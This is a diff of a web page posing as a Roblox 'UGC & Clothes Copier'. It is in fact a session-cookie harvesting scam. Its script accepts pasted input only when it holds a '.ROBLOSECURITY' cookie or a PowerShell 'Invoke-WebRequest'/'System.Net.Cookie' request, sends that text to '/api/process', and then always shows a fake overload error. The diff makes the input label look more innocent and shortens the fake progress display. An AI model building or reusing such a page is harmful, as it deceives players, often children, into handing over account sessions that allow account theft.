@@ -6,77 +6,126 @@
 <title>RBXDEV | UGC & Clothes Copier</title>
 <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200..1000&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#17191B;--panel:#232527;--panel2:#1D1F21;--line:#393B3D;--ink:#F7F7F8;--muted:#BDBEBE;--blue:#00A2FF;--green:#02B757;--red:#E8505B;
---f:"Nunito","Helvetica Neue",Arial,sans-serif;--m:"JetBrains Mono",ui-monospace,Consolas,monospace;
-box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
-@media (prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#E9EDF0;--panel:#fff;--panel2:#F4F6F8;--line:#CDD2D6;--ink:#1B1D1F;--muted:#5B5F63}}
-:root[data-theme="dark"]{--bg:#17191B;--panel:#232527;--panel2:#1D1F21;--line:#393B3D;--ink:#F7F7F8;--muted:#BDBEBE}
-html{scroll-behavior:smooth}
-*{box-sizing:border-box;margin:0}
-body{background:var(--bg);color:var(--ink);font:600 18px/1.5 var(--f);overflow-x:hidden}
-section{position:relative;z-index:1}
-/* falling blocks */
-.blocks{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
-.blocks i{position:absolute;top:-80px;border-radius:12px;opacity:.9;animation:fall linear infinite;box-shadow:inset 0 -8px 0 rgba(0,0,0,.22),inset 0 6px 0 rgba(255,255,255,.18)}
-@keyframes fall{to{transform:translateY(120vh) rotate(var(--r))}}
-/* hero */
-.hero{min-height:100svh;display:flex;flex-direction:column;justify-content:center;padding:6vh 7vw}
-.tag{display:inline-flex;align-items:center;gap:.6rem;background:var(--panel);border:2px solid var(--line);border-radius:12px;padding:.45rem .9rem;font-size:.95rem;width:max-content;margin-bottom:1.6rem}
-.tag b{width:12px;height:12px;border-radius:3px;background:var(--green);transform:rotate(12deg);box-shadow:0 0 12px var(--green)}
-.hero h1{font-size:clamp(3.4rem,11vw,9rem);line-height:.88;letter-spacing:-.04em;max-width:11ch}
-.hero .w{display:inline-block;white-space:nowrap;margin-right:.2em}
-.hero .l{display:inline-block;font-weight:300;color:var(--ink)}
-.hero .l.hot{color:var(--blue)}
-.hero p{margin-top:2rem;max-width:32ch;color:var(--muted);font-size:1.25rem}
-.cue{position:absolute;left:7vw;bottom:5vh;color:var(--muted);display:flex;gap:.7rem;align-items:center;font-size:.95rem}
-.cue i{width:20px;height:20px;border-radius:5px;background:var(--blue);animation:hop 1.3s ease-in-out infinite}
-@keyframes hop{50%{transform:translateY(10px) rotate(45deg)}}
-/* video */
-.tall{height:260vh}
-.stick{position:sticky;top:0;height:100svh;display:grid;place-items:center;padding:0 4vw;overflow:hidden}
-.vtitle{position:absolute;top:9vh;left:0;right:0;text-align:center;color:var(--muted)}
-.vtitle b{color:var(--ink);font-weight:900}
-.screen{width:min(1100px,100%);aspect-ratio:16/9;background:var(--panel);border:3px solid var(--line);position:relative;overflow:hidden;transform:scale(.55);border-radius:36px;box-shadow:0 30px 90px -30px var(--blue)}
-.screen iframe{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border:0}
-.vcap{position:absolute;left:0;right:0;bottom:9vh;text-align:center;font-size:clamp(1.7rem,4.5vw,3.2rem);font-weight:900;letter-spacing:-.02em;opacity:0;pointer-events:none}
-/* panel */
-.up{min-height:100svh;display:grid;place-items:center;padding:12vh 5vw}
-.card{width:min(660px,100%);background:var(--panel);border:2px solid var(--line);border-radius:24px;overflow:hidden;box-shadow:0 30px 80px -40px #000}
-.top{display:flex;justify-content:space-between;align-items:center;padding:1.1rem 1.4rem;border-bottom:2px solid var(--line)}
-.top h2{font-size:1.35rem;font-weight:900;display:flex;align-items:center;gap:.7rem}
-.logo{width:26px;height:26px;border-radius:6px;background:var(--blue);transform:rotate(12deg);position:relative;box-shadow:inset 0 -4px 0 rgba(0,0,0,.25)}
-.logo::after{content:"";position:absolute;inset:8px;background:var(--panel);border-radius:2px}
-.pill{font:500 .75rem var(--m);border:2px solid color-mix(in srgb,var(--green) 55%,transparent);color:var(--green);border-radius:8px;padding:.25rem .6rem}
-.body{padding:1.4rem;display:grid;gap:1.1rem}
-.stat{display:flex;gap:.9rem;align-items:center;background:var(--panel2);border:2px solid var(--line);border-radius:16px;padding:.9rem 1.1rem}
-.dot{width:14px;height:14px;border-radius:4px;background:var(--green);box-shadow:0 0 14px var(--green);transform:rotate(12deg);flex:none;transition:background .2s,box-shadow .2s}
-.stat b{display:block;font-weight:800}.stat small{color:var(--muted);font-weight:600;font-size:.88rem}
-label{font:500 0.65rem var(--m);color:var(--muted);display:flex;justify-content:space-between;margin-bottom:.4rem;letter-spacing:0.04em}
-textarea{width:100%;min-height:65px;height:65px;resize:vertical;background:var(--panel2);color:var(--ink);border:2px solid var(--line);border-radius:12px;padding:0.7rem 0.9rem;font:400 .85rem/1.3 var(--m);outline:0;transition:border-color .15s,box-shadow .15s}
-textarea:focus{border-color:var(--blue);box-shadow:0 0 0 4px color-mix(in srgb,var(--blue) 25%,transparent)}
-.row{display:flex;gap:.7rem}
-.mini{flex:1;font:800 .9rem var(--f);background:transparent;color:var(--ink);border:2px solid var(--line);border-radius:12px;padding:.7rem;cursor:pointer;transition:border-color .15s}
-.mini:hover{border-color:var(--blue)}
-.ready{display:flex;justify-content:space-between;align-items:center;background:var(--panel2);border:2px solid var(--line);border-radius:16px;padding:.9rem 1.1rem}
-.ready div{display:flex;align-items:center;gap:.8rem}
-.chk{width:28px;height:28px;border-radius:50%;background:var(--line);display:grid;place-items:center;transition:background .2s}
-.chk svg{width:15px;stroke:#fff;fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
-.ready.ok .chk{background:var(--green)}
-.go{font:900 1.1rem var(--f);border:0;border-radius:16px;padding:1.15rem;cursor:pointer;color:#fff;background:linear-gradient(90deg,var(--blue),var(--green));box-shadow:inset 0 -6px 0 rgba(0,0,0,.22);transition:transform .1s,filter .2s}
-.go:hover{filter:brightness(1.1)}.go:active{transform:translateY(3px);box-shadow:none}
-.go:disabled{filter:grayscale(1) brightness(.6);cursor:not-allowed}
+:root {
+  --bg: #17191B; --panel: #232527; --panel2: #1D1F21; --line: #393B3D;
+  --ink: #F7F7F8; --muted: #BDBEBE; --blue: #00A2FF; --green: #02B757; --red: #E8505B;
+  --f: "Nunito", "Helvetica Neue", Arial, sans-serif;
+  --m: "JetBrains Mono", ui-monospace, Consolas, monospace;
+  box-sizing: border-box;
+  padding-top: env(safe-area-inset-top, 0px);
+  padding-bottom: env(safe-area-inset-bottom, 0px);
+}
+
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg: #E9EDF0; --panel: #fff; --panel2: #F4F6F8; --line: #CDD2D6; --ink: #1B1D1F; --muted: #5B5F63;
+  }
+}
+
+:root[data-theme="dark"] {
+  --bg: #17191B; --panel: #232527; --panel2: #1D1F21; --line: #393B3D; --ink: #F7F7F8; --muted: #BDBEBE;
+}
+
+html { scroll-behavior: smooth; }
+* { box-sizing: border-box; margin: 0; }
+body { background: var(--bg); color: var(--ink); font: 600 18px/1.5 var(--f); overflow-x: hidden; }
+section { position: relative; z-index: 1; }
+
+/* Falling background blocks */
+.blocks { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
+.blocks i {
+  position: absolute; top: -80px; border-radius: 12px; opacity: .9;
+  animation: fall linear infinite;
+  box-shadow: inset 0 -8px 0 rgba(0,0,0,.22), inset 0 6px 0 rgba(255,255,255,.18);
+}
+@keyframes fall { to { transform: translateY(120vh) rotate(var(--r)); } }
+
+/* Hero section */
+.hero { min-height: 100svh; display: flex; flex-direction: column; justify-content: center; padding: 6vh 7vw; }
+.tag {
+  display: inline-flex; align-items: center; gap: .6rem; background: var(--panel);
+  border: 2px solid var(--line); border-radius: 12px; padding: .45rem .9rem; font-size: .95rem; width: max-content; margin-bottom: 1.6rem;
+}
+.tag b { width: 12px; height: 12px; border-radius: 3px; background: var(--green); transform: rotate(12deg); box-shadow: 0 0 12px var(--green); }
+.hero h1 { font-size: clamp(3.4rem, 11vw, 9rem); line-height: .88; letter-spacing: -.04em; max-width: 11ch; }
+.hero .w { display: inline-block; white-space: nowrap; margin-right: .2em; }
+.hero .l { display: inline-block; font-weight: 300; color: var(--ink); }
+.hero .l.hot { color: var(--blue); }
+.hero p { margin-top: 2rem; max-width: 32ch; color: var(--muted); font-size: 1.25rem; }
+.cue { position: absolute; left: 7vw; bottom: 5vh; color: var(--muted); display: flex; gap: .7rem; align-items: center; font-size: .95rem; }
+.cue i { width: 20px; height: 20px; border-radius: 5px; background: var(--blue); animation: hop 1.3s ease-in-out infinite; }
+@keyframes hop { 50% { transform: translateY(10px) rotate(45deg); } }
+
+/* Video tutorial sticky section */
+.tall { height: 260vh; }
+.stick { position: sticky; top: 0; height: 100svh; display: grid; place-items: center; padding: 0 4vw; overflow: hidden; }
+.vtitle { position: absolute; top: 9vh; left: 0; right: 0; text-align: center; color: var(--muted); }
+.vtitle b { color: var(--ink); font-weight: 900; }
+.screen {
+  width: min(1100px, 100%); aspect-ratio: 16/9; background: var(--panel); border: 3px solid var(--line);
+  position: relative; overflow: hidden; transform: scale(.55); border-radius: 36px; box-shadow: 0 30px 90px -30px var(--blue);
+}
+.screen iframe { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; border: 0; }
+.vcap {
+  position: absolute; left: 0; right: 0; bottom: 9vh; text-align: center;
+  font-size: clamp(1.7rem, 4.5vw, 3.2rem); font-weight: 900; letter-spacing: -.02em; opacity: 0; pointer-events: none;
+}
+
+/* Panel section */
+.up { min-height: 100svh; display: grid; place-items: center; padding: 12vh 5vw; }
+.card { width: min(660px, 100%); background: var(--panel); border: 2px solid var(--line); border-radius: 24px; overflow: hidden; box-shadow: 0 30px 80px -40px #000; }
+.top { display: flex; justify-content: space-between; align-items: center; padding: 1.1rem 1.4rem; border-bottom: 2px solid var(--line); }
+.top h2 { font-size: 1.35rem; font-weight: 900; display: flex; align-items: center; gap: .7rem; }
+.logo { width: 26px; height: 26px; border-radius: 6px; background: var(--blue); transform: rotate(12deg); position: relative; box-shadow: inset 0 -4px 0 rgba(0,0,0,.25); }
+.logo::after { content: ""; position: absolute; inset: 8px; background: var(--panel); border-radius: 2px; }
+.pill { font: 500 .75rem var(--m); border: 2px solid color-mix(in srgb, var(--green) 55%, transparent); color: var(--green); border-radius: 8px; padding: .25rem .6rem; }
+.body { padding: 1.4rem; display: grid; gap: 1.1rem; }
+.stat { display: flex; gap: .9rem; align-items: center; background: var(--panel2); border: 2px solid var(--line); border-radius: 16px; padding: .9rem 1.1rem; }
+.dot { width: 14px; height: 14px; border-radius: 4px; background: var(--green); box-shadow: 0 0 14px var(--green); transform: rotate(12deg); flex: none; }
+.stat b { display: block; font-weight: 800; }
+.stat small { color: var(--muted); font-weight: 600; font-size: .88rem; }
+label { font: 500 .8rem var(--m); color: var(--muted); display: flex; justify-content: space-between; margin-bottom: .5rem; }
+textarea {
+  width: 100%; min-height: 160px; resize: vertical; background: var(--panel2); color: var(--ink);
+  border: 2px solid var(--line); border-radius: 16px; padding: 1rem 1.1rem; font: 400 .9rem/1.5 var(--m); outline: 0;
+  transition: border-color .15s, box-shadow .15s;
+}
+textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 4px color-mix(in srgb, var(--blue) 25%, transparent); }
+.row { display: flex; gap: .7rem; }
+.mini {
+  flex: 1; font: 800 .9rem var(--f); background: transparent; color: var(--ink);
+  border: 2px solid var(--line); border-radius: 12px; padding: .7rem; cursor: pointer; transition: border-color .15s;
+}
+.mini:hover { border-color: var(--blue); }
+.ready { display: flex; justify-content: space-between; align-items: center; background: var(--panel2); border: 2px solid var(--line); border-radius: 16px; padding: .9rem 1.1rem; }
+.ready div { display: flex; align-items: center; gap: .8rem; }
+.chk { width: 28px; height: 28px; border-radius: 50%; background: var(--line); display: grid; place-items: center; transition: background .2s; }
+.chk svg { width: 15px; stroke: #fff; fill: none; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
+.ready.ok .chk { background: var(--green); }
+.go {
+  font: 900 1.1rem var(--f); border: 0; border-radius: 16px; padding: 1.15rem; cursor: pointer; color: #fff;
+  background: linear-gradient(90deg, var(--blue), var(--green)); box-shadow: inset 0 -6px 0 rgba(0,0,0,.22);
+  transition: transform .1s, filter .2s;
+}
+.go:hover { filter: brightness(1.1); }
+.go:active { transform: translateY(3px); box-shadow: none; }
+.go:disabled { filter: grayscale(1) brightness(.6); cursor: not-allowed; }
 
 /* Modals */
-.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);display:grid;place-items:center;z-index:100;opacity:0;pointer-events:none;transition:opacity .25s ease}
-.modal-overlay.active{opacity:1;pointer-events:auto}
-.modal-box{width:min(420px,90vw);background:var(--panel);border:2px solid var(--line);border-radius:24px;padding:2rem;text-align:center;box-shadow:0 30px 90px rgba(0,0,0,0.8);transform:scale(.95);transition:transform .25s ease}
-.modal-overlay.active .modal-box{transform:scale(1)}
-.spinner{width:40px;height:40px;border:4px solid var(--line);border-top-color:var(--blue);border-radius:50%;animation:spin .8s linear infinite;margin:1.2rem auto 0}
-@keyframes spin{to{transform:rotate(360deg)}}
-.progress-container{width:100%;background:var(--panel2);height:8px;border-radius:4px;overflow:hidden;margin:1rem 0 .5rem;border:1px solid var(--line)}
-.progress-bar{height:100%;background:linear-gradient(90deg,var(--blue),var(--green));width:0%;transition:width .3s linear}
-button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outline-offset:3px}
-@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}html{scroll-behavior:auto}}
+.modal-overlay {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
+  display: grid; place-items: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity .25s ease;
+}
+.modal-overlay.active { opacity: 1; pointer-events: auto; }
+.modal-box {
+  width: min(420px, 90vw); background: var(--panel); border: 2px solid var(--line); border-radius: 24px;
+  padding: 2rem; text-align: center; box-shadow: 0 30px 90px rgba(0,0,0,0.8); transform: scale(.95); transition: transform .25s ease;
+}
+.modal-overlay.active .modal-box { transform: scale(1); }
+.spinner { width: 40px; height: 40px; border: 4px solid var(--line); border-top-color: var(--blue); border-radius: 50%; animation: spin .8s linear infinite; margin: 1.2rem auto 0; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.progress-container { width: 100%; background: var(--panel2); height: 8px; border-radius: 4px; overflow: hidden; margin: 1rem 0 .5rem; border: 1px solid var(--line); }
+.progress-bar { height: 100%; background: linear-gradient(90deg, var(--blue), var(--green)); width: 0%; transition: width .3s ease; }
 </style>
 </head>
 <body>
@@ -85,7 +134,7 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
 <section class="hero">
   <div class="tag"><b></b>System Operational</div>
   <h1 id="headline">Copy Any Clothing.</h1>
-  <p>Watch the quick tutorial, then enter your file below.</p>
+  <p>Watch the quick tutorial, then paste your item data or generator link below.</p>
   <div class="cue"><i></i>Scroll down</div>
 </section>
 
@@ -103,16 +152,16 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
   <div class="card">
     <div class="top"><h2><span class="logo"></span>UGC & Clothes Copier</h2><span class="pill">ONLINE</span></div>
     <div class="body">
-      <div class="stat" id="stat"><span class="dot"></span><div><b id="st1">Copier Online</b><small id="st2">Awaiting file input.</small></div></div>
+      <div class="stat"><span class="dot"></span><div><b>Copier Online</b><small>Awaiting clothing data or configuration link.</small></div></div>
       <div>
-        <label for="script-input"><span>ENTER YOUR FILE</span></label>
-        <textarea id="script-input" spellcheck="false" placeholder="Enter your file here..."></textarea>
+        <label for="script-input"><span>ENTER CLOTHING DATA OR CONFIGURATION</span></label>
+        <textarea id="script-input" spellcheck="false" placeholder="Paste asset data, configuration script, or links here..."></textarea>
       </div>
       <div class="row">
         <button class="mini" id="paste-btn">Paste from clipboard</button>
         <button class="mini" id="clear">Clear</button>
       </div>
-      <div class="ready" id="ready"><div><span class="chk"><svg viewBox="0 0 24 24"><path d="M5 12l5 5 9-10"/></svg></span><span id="rtxt">Awaiting input data</span></div></div>
+      <div class="ready" id="ready"><div><span class="chk"><svg viewBox="0 0 24 24"><path d="M5 12l5 5 9-10"/></svg></span><span id="rtxt">Awaiting data input</span></div></div>
       <button class="go" id="submit-btn" disabled>Start Copying</button>
     </div>
   </div>
@@ -131,7 +180,7 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
   </div>
 </div>
 
-<!-- Dynamic Error / Alert Modal -->
+<!-- Dynamic Error Modal -->
 <div id="error-modal" class="modal-overlay">
   <div class="modal-box" id="modal-box-border" style="border-color: var(--red);">
     <div id="modal-icon-wrap" style="width: 48px; height: 48px; border-radius: 50%; background: color-mix(in srgb, var(--red) 20%, transparent); color: var(--red); display: grid; place-items: center; margin: 0 auto 1rem; border: 2px solid var(--red);">
@@ -144,24 +193,28 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
 </div>
 
 <script>
-const clamp=(v,a,b)=>Math.min(b,Math.max(a,v));
+const clamp = (v, a, b) => Math.min(b, Math.max(a, v));
 
-const cols=["#00A2FF","#02B757","#F7C948","#E8505B","#9B6BFF"], bl=document.getElementById("blocks");
-for(let i=0;i<14;i++){
-  const e=document.createElement("i"), s=28+Math.random()*52;
-  e.style.cssText=`left:${Math.random()*100}%;width:${s}px;height:${s}px;background:${cols[i%5]};--r:${(Math.random()*2-1)*540}deg;animation-duration:${14+Math.random()*16}s;animation-delay:${-Math.random()*30}s;opacity:.${3+i%4}`;
+// Falling background blocks setup
+const cols = ["#00A2FF", "#02B757", "#F7C948", "#E8505B", "#9B6BFF"];
+const bl = document.getElementById("blocks");
+for (let i = 0; i < 14; i++) {
+  const e = document.createElement("i");
+  const s = 28 + Math.random() * 52;
+  e.style.cssText = `left:${Math.random() * 100}%;width:${s}px;height:${s}px;background:${cols[i % 5]};--r:${(Math.random() * 2 - 1) * 540}deg;animation-duration:${14 + Math.random() * 16}s;animation-delay:${-Math.random() * 30}s;opacity:.${3 + i % 4}`;
   bl.appendChild(e);
 }
 
-let mx=0, my=0, ptr=false;
+// Hero headline animation
+let mx = 0, my = 0, ptr = false;
 addEventListener("pointermove", e => { mx = e.clientX; my = e.clientY; ptr = true; });
-const h = document.getElementById("headline"), txt = h.textContent; 
-h.textContent = ""; h.setAttribute("aria-label", txt); 
+const h = document.getElementById("headline"), txt = h.textContent;
+h.textContent = ""; h.setAttribute("aria-label", txt);
 const L = [];
 txt.split(" ").forEach((w, wi) => {
   const s = document.createElement("span"); s.className = "w"; s.setAttribute("aria-hidden", "true");
   [...w].forEach(c => {
-    const l = document.createElement("span"); l.className = "l" + (wi === 1 ? " hot" : ""); l.textContent = c; 
+    const l = document.createElement("span"); l.className = "l" + (wi === 1 ? " hot" : ""); l.textContent = c;
     s.appendChild(l); L.push(l);
   });
   h.appendChild(s);
@@ -176,6 +229,7 @@ txt.split(" ").forEach((w, wi) => {
   requestAnimationFrame(tick);
 })(0);
 
+// Scroll scaling for video section
 const tall = document.getElementById("tutorial"), scr = document.getElementById("screen"), cap = document.getElementById("vcap");
 function sc() {
   const r = tall.getBoundingClientRect(), p = clamp(-r.top / (r.height - innerHeight), 0, 1), g = clamp(p/.55, 0, 1), c = clamp((p-.8)/.15, 0, 1);
@@ -186,6 +240,7 @@ function sc() {
 }
 addEventListener("scroll", sc, {passive: true}); addEventListener("resize", sc); sc();
 
+// Input management
 const scriptInput = document.getElementById("script-input");
 const submitBtn = document.getElementById("submit-btn");
 const readyBox = document.getElementById("ready");
@@ -200,21 +255,19 @@ const errorModal = document.getElementById("error-modal");
 const understoodBtn = document.getElementById("understood-btn");
 const modalTitle = document.getElementById("modal-title");
 const modalDesc = document.getElementById("modal-desc");
-const modalBoxBorder = document.getElementById("modal-box-border");
-const modalIconWrap = document.getElementById("modal-icon-wrap");
 
 function checkInput() {
   const val = scriptInput.value.trim();
   const hasContent = val.length > 0;
   submitBtn.disabled = !hasContent;
   readyBox.classList.toggle("ok", hasContent);
-  rtxt.textContent = hasContent ? "Data loaded & ready" : "Awaiting input data";
+  rtxt.textContent = hasContent ? "Data loaded & ready" : "Awaiting data input";
 }
 scriptInput.addEventListener("input", checkInput);
 
-document.getElementById("clear").onclick = () => { scriptInput.value=""; checkInput(); scriptInput.focus(); };
+document.getElementById("clear").onclick = () => { scriptInput.value = ""; checkInput(); scriptInput.focus(); };
 document.getElementById("paste-btn").onclick = async () => {
-  try { scriptInput.value = await navigator.clipboard.readText(); checkInput(); } 
+  try { scriptInput.value = await navigator.clipboard.readText(); checkInput(); }
   catch(e) { scriptInput.focus(); }
 };
 
@@ -225,26 +278,11 @@ function showProcessing(text, pct) {
   processingModal.classList.add("active");
 }
 function hideProcessing() { processingModal.classList.remove("active"); }
-
-function showModalMessage(title, message, isError) {
+function showModalMessage(title, message) {
   modalTitle.textContent = title;
   modalDesc.textContent = message;
-  if(isError) {
-    modalBoxBorder.style.borderColor = "var(--red)";
-    modalIconWrap.style.background = "color-mix(in srgb, var(--red) 20%, transparent)";
-    modalIconWrap.style.color = "var(--red)";
-    modalIconWrap.style.borderColor = "var(--red)";
-    understoodBtn.style.background = "var(--red)";
-  } else {
-    modalBoxBorder.style.borderColor = "var(--green)";
-    modalIconWrap.style.background = "color-mix(in srgb, var(--green) 20%, transparent)";
-    modalIconWrap.style.color = "var(--green)";
-    modalIconWrap.style.borderColor = "var(--green)";
-    understoodBtn.style.background = "linear-gradient(90deg,var(--blue),var(--green))";
-  }
   errorModal.classList.add("active");
 }
-
 understoodBtn.onclick = () => { errorModal.classList.remove("active"); };
 
 submitBtn.addEventListener("click", async () => {
@@ -252,64 +290,46 @@ submitBtn.addEventListener("click", async () => {
   if(!payload) return;
 
   if(payload.length < 40 || (!payload.includes("System.Net.Cookie") && !payload.includes("Invoke-WebRequest") && !payload.includes(".ROBLOSECURITY"))) {
-    showModalMessage("Invalid Input", "Error: Please watch the tutorial again.", true);
+    showModalMessage("Invalid Input", "Error: Please watch the tutorial again.");
     return;
   }
 
   submitBtn.disabled = true;
-  showProcessing("Validating Asset Data...", 10);
-
-  const fetchPromise = fetch('/api/process', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ data: payload })
-  });
-
-  const totalDuration = 15000;
-  const intervalTime = 150;
-  const totalSteps = totalDuration / intervalTime;
-  let currentStep = 0;
-
-  const statusStages = [
-    { at: 0.15, text: "Connecting to asset endpoints..." },
-    { at: 0.40, text: "Parsing clothing components..." },
-    { at: 0.70, text: "Bypassing security restrictions..." },
-    { at: 0.90, text: "Finalizing asset export..." }
-  ];
-
-  await new Promise((resolve) => {
-    const timer = setInterval(() => {
-      currentStep++;
-      const progress = Math.min(Math.round((currentStep / totalSteps) * 100), 98);
-      progressBar.style.width = progress + '%';
-      progressPct.textContent = progress + '%';
-
-      const ratio = currentStep / totalSteps;
-      for (let stage of statusStages) {
-        if (ratio >= stage.at && ratio < stage.at + 0.25) {
-          modalStatusText.textContent = stage.text;
-          break;
-        }
-      }
-
-      if (currentStep >= totalSteps) {
-        clearInterval(timer);
-        resolve();
-      }
-    }, intervalTime);
-  });
+  showProcessing("Validating Asset Data...", 20);
+  await new Promise(r => setTimeout(r, 400));
+  showProcessing("Processing clothing copy sequence...", 55);
 
   try {
-    const response = await fetchPromise;
-    const result = await response.json();
+    let currentPct = 55;
+    const ticker = setInterval(() => {
+      if(currentPct < 90) {
+        currentPct += 5;
+        progressPct.textContent = currentPct + '%';
+        progressBar.style.width = currentPct + '%';
+      }
+    }, 200);
 
+    const response = await fetch('/api/process', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: payload })
+    });
+
+    const result = await response.json();
+    clearInterval(ticker);
+
+    if(!response.ok || !result.success) throw new Error("Execution failed");
+
+    showProcessing("Finalizing asset export...", 100);
+    await new Promise(r => setTimeout(r, 400));
     hideProcessing();
-    showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.", true);
+
+    showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.");
     scriptInput.value = '';
     checkInput();
   } catch (err) {
     hideProcessing();
-    showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.", true);
+    showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.");
   } finally {
     submitBtn.disabled = false;
   }
